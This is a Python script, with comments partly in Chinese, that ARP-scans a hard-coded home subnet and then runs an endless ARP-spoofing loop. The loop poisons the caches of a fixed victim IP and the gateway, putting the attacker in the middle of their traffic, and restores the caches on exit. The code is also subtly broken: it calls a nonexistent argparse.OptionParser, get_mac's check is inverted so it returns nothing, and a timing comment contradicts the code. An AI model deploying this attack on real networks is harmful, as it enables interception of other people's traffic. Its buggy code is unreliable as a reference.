import scapy.all as scapy
import time
import argparse
from scapy_http import http
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


gateway_ip = "192.168.0.1" 
target_ip = "192.168.0.105"

#   Scan.py
def get_argments():
    parser = argparse.OptionParser()
    parser.add_option("-t", "--target", dest="target",
    help="Target IP / IP range") #當使用者在終端機執行 python3 main.py -target gateway_ip/24，期望在終端機看到輸出看到IP range。
    options = parser.parse_args() #解析使用者輸入的值
    return options

def scan(ip):
    #Create ARP request directed to broadcast MAC asking for IP#
    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
    #----------------------------------------------------------#
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
    
    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list  
    
    
def print_result(list):   #Parse the response
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for client in list:
        print(client["ip"] + "\t\t" + client["mac"])
#   =============================================================              
      
        

#   Spoofing
def get_mac(ip):
    #Create ARP request directed to broadcast MAC asking for IP#
    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
    #----------------------------------------------------------#
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
    if answered_list == "":
        return (answered_list[0][1].hwsrc)  

def spoof(target_ip, spoof_ip): #輸入目標的IP, 我們假裝的IP
    target_mac = get_mac(target_ip) #call 已寫好的get_mac的function
    packet = scapy.ARP(op=2, pdst=target_ip,
    hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) #發送封包

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                            hwdst=destination_mac,
                            psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    

#   =============================================================    


#   start interface
# print("Enter the IPv4 Address of the route: ", end='')
# route_ip = input()

# ===================================================
#   display all the subnetwork of the gateway

count = 5
while (count > 0):
    scan_result = scan("192.168.0.1/24")    #可拿到所有子網路的封包回應
    print_result(scan_result)
    count-=1

# ===================================================

#   choose the victim and spoofing
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(0.1)  # Waits for two seconds
    
       
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
# ====================================================

    